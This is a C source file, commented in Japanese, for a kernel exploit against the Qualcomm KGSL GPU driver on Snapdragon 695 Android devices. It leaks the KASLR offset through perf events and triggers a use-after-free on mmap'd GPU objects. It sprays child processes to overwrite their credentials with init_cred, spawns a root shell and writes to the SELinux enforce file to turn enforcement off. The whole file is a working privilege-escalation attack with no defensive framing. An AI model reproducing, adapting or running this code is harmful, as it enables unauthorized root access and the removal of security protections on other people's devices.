

#include "avc_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <poll.h>

static int kgsl_fd = -1;
static uint64_t alloc_flags = 0;

static void die(const char *msg) { perror(msg); exit(1); }

/* ========== KGSL 基本操作（CPUマップなし） ========== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static void gpuobj_munmap(void *addr, size_t size) {
    if (munmap(addr, size) < 0) die("gpuobj_munmap");
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

/* ========== KASLR 検出（init_cred 取得） ========== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ========== setenforce 0 ========== */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ========== 子プロセススプレー ========== */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(int notify_pipe) {
    printf("[SPRAY] 子プロセスを %d 個生成中...\n", SPRAY_PIDS);
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "UAF_TASK");
            for (int j = 0; j < 600; j++) {
                if (getuid() == 0) {
                    write(notify_pipe, &p, sizeof(p));
                    // root シェル起動（ここで setenforce 0 を実行）
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    printf("[SPRAY] %d 個の子プロセスを生成完了\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
}

/* ========== メイン ========== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - mmap UAF 版\n");
    printf("[*] 戦略: UAF + mmap → task_struct->cred 書き換え → root 化 → setenforce 0\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // KASLR 検出
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR 検出失敗\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", init_cred_addr);

    // CPUマップなし（GPUアドレスは不要だが、物理ページを確保するために必要）
    alloc_flags = KGSL_CACHEMODE_WRITEBACK;

    // ---- Phase 1: 巨大オブジェクト確保 ----
    printf("[*] Phase 1: 巨大GPUオブジェクト (UAF_SIZE=0x%lx) を確保\n", UAF_SIZE);
    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    printf("[+] 巨大オブジェクト id=%d\n", uaf_id);

    // ---- Phase 2: mmap & munmap ----
    printf("[*] Phase 2: 巨大オブジェクトを mmap し、すぐに munmap（物理ページをユーザ空間にマッピング）\n");
    void *uaf_map = gpuobj_mmap(UAF_SIZE, uaf_id);
    printf("[+] マッピングアドレス = %p\n", uaf_map);
    gpuobj_munmap(uaf_map, UAF_SIZE);
    printf("[+] munmap 完了\n");

    // ---- Phase 3: 巨大オブジェクト解放 ----
    printf("[*] Phase 3: 巨大オブジェクト解放（物理ページがフリーになる）\n");
    gpuobj_free(uaf_id);
    printf("[+] 解放完了\n");

    // ---- Phase 4: メモリ回収 ----
    printf("[*] Phase 4: メモリ回収 (compact_memory, drop_caches)\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ---- Phase 5: 通知用パイプ ----
    int pipefd[2];
    if (pipe(pipefd) < 0) die("pipe");
    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);

    // ---- Phase 6: 子プロセススプレー（task_struct を解放領域に配置） ----
    spawn_spray(pipefd[1]);
    close(pipefd[1]);

    // ---- Phase 7: 小さなオブジェクトを複数確保 & mmap（物理ページを再利用） ----
    printf("[*] Phase 7: 小さなオブジェクト (%d個) を確保して mmap\n", OVERLAP_COUNT);
    void *small_maps[OVERLAP_COUNT];
    int small_ids[OVERLAP_COUNT];
    int success = 0;

    for (int i = 0; i < OVERLAP_COUNT; i++) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id < 0) { printf("  確保失敗 id=%d\n", id); continue; }
        void *map = gpuobj_mmap(OVERLAP_SIZE, id);
        if (map == MAP_FAILED) { gpuobj_free(id); continue; }
        small_ids[success] = id;
        small_maps[success] = map;
        success++;
        if (success >= OVERLAP_COUNT) break;
    }
    printf("[+] 実際に確保・マッピングできた数: %d\n", success);
    if (success == 0) {
        printf("[-] 小さなオブジェクトの確保に失敗\n");
        kill_spray_children();
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 8: 各マッピングに init_cred アドレスを書き込む ----
    printf("[*] Phase 8: 各マッピングの全8バイトアライン位置に init_cred (0x%lx) を書き込み\n", init_cred_addr);
    for (int i = 0; i < success; i++) {
        uint64_t *ptr = (uint64_t *)small_maps[i];
        // ページの先頭から末尾まで（0x0 から 0xFF8）を8バイト単位で上書き
        // ただしページヘッダを避ける必要はない（書き込んでも構わない）
        for (int off = 0; off < 0x1000; off += 8) {
            ptr[off/8] = init_cred_addr;
        }
        // キャッシュの一貫性のため、CPUキャッシュをフラッシュ（必要なら）
        __sync_synchronize();
    }
    printf("[+] 書き込み完了\n");

    // ---- Phase 9: root 化を待つ ----
    printf("[*] Phase 9: root になった子プロセスを待機中...\n");
    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] root 獲得！ PID=%d\n", winner);
        // 他の子プロセスを殺す
        for (int i = 0; i < n_spray; i++) {
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        }
        while (waitpid(-1, NULL, WNOHANG) > 0);
        // root シェルが起動するのを待つ
        waitpid(winner, NULL, 0);
        printf("[+] root シェルが終了しました。\n");
    } else {
        printf("[-] タイムアウト: root になりませんでした。\n");
        kill_spray_children();
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 10: SELinux 状態確認 ----
    printf("[*] SELinux 状態確認:\n");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    if (try_setenforce0()) {
        printf("[+] SELinux permissive になりました！\n");
    } else {
        printf("[-] setenforce 0 に失敗しました（root シェルで手動実行が必要かもしれません）\n");
    }

    // 後片付け
    for (int i = 0; i < success; i++) {
        gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
        gpuobj_free(small_ids[i]);
    }
    kill_spray_children();
    close(kgsl_fd);
    return 0;
}
